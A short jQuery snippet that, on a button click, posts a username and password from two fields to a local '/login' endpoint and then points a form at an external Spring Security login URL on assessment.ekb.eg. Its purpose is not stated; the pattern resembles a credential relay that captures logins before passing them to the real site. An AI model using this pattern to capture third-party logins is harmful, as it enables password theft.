$("button").click(function () {
    $.post("/login",
        {
            j_username: $('#a').val(),
            j_password: $('#b').val()
        },
    );
    $('#p_form').attr('action', 'https://assessment.ekb.eg/pearson/j_spring_security_check')
});
